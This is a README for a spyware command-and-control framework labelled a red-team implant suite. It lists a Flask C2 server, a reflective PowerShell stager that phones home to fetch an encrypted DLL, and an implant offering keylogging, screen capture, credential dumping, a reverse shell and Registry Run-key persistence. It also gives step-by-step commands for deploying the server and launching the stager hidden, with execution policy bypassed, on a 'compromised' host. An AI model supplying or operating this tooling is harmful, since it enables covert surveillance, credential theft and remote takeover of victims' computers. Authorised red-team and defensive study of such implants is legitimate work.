# Spyware Framework – Advanced Red‑Team Implant Suite
## (C2‑integrated, AES‑encrypted, ASCII‑UI‑enhanced)

---

## 1. Overview
Full‑stack C2 framework comprising:
- **Python C2 server** (`c2_server.py`) – AES‑32/16, task/result endpoints, key management.
- **Reflective stager** (`Stager.ps1`) – fetches keys + encrypted Stage1.dll, reflective load.
- **C# implant** (`Stage1.dll`) – native Windows agent with ASCII console UI, keylogger, screen capture, cred dump, reverse shell, persistence‑aware.
- **PowerShell launcher** (`Spyware.ps1`) – ASCII UI menu, optional reflective Stage1 launch, built‑in capabilities, persistence via Registry `Run` key.

All components share the same AES key/IV negotiation via `/key` endpoint; no hardcoded credentials.

---

## 2. Quick‑Start (All-in‑one)

### 2.1 Deploy C2 Server
```bash
# 1. Install deps
python3 -m venv .venv
source .venv/bin/activate
pip install flask cryptography

# 2. Place Stage1.dll beside this script
cp ../Stage1.dll .

# 3. Run
python c2_server.py
# Server -> http://0.0.0.0:8080  (endpoints: /key, /stage1, /task/<id>, /result/<id>)


2.2 Launch Stager on Target
# On the compromised/engagement host (PowerShell 5+):
#   Edit $C2Host / $C2Port at the top of Stager.ps1 to match your IP.
powershell -nop -w hidden -exec bypass -File Stager.ps1
# The stager will:
#   • Phone home → /key  (receives AES key/IV)
#   • Fetch /stage1      (AES‑encrypted DLL)
#   • Decrypt + reflective load
#   • Enter C2 task loop (keylogger, screen, shell, etc.)

2.3 (Optional) Direct UI via Spyware.ps1
powershell -nop -w hidden -exec bypass -File Spyware.ps1
# Presents a numbered ASCII menu:
#   1 – Start keylogger
#   2 – Capture screenshot
#   3 – Dump stored credentials
#   4 – Reverse‑shell command
#   5 – Launch Stage1 reflectively (overwrites current session)
#   0 – Exit

TL;DR Commands
# Server side
python -m venv .venv && source .venv/bin/activate
pip install flask cryptography
python c2_server.py          # serves on :8080

# Target side (PowerShell)
# Edit Stager.ps1 → set $C2Host, $C2Port
powershell -nop -w hidden -exec bypass -File Stager.ps1
# Or for UI menu:
powershell -nop -w hidden -exec bypass -File Spyware.ps1